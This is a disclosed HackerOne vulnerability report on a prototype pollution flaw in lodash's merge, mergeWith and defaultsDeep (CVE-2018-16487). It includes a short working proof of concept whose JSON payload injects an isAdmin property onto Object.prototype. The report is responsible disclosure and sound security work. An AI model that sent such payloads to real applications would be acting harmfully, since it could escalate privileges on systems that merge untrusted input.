# [H] Prototype pollution attack (lodash / constructor.prototype)

## Summary
Severity: High (CVSS 7.0)
Program: Node.js third-party modules
Weakness: Uncontrolled Resource Consumption
Reporter: asgerf
State: resolved
Disclosed: 2018-10-30T12:59:31.457Z
CVE: CVE-2018-16487
Source: https://hackerone.com/reports/380873

## Details
I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** lodash
**version:** 4.17.10
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

12M downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` and send it to `_.merge`.

```javascript
var _ = require('lodash');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
_.merge({}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

_Trimmed to 38 lines — full report: https://hackerone.com/reports/380873_
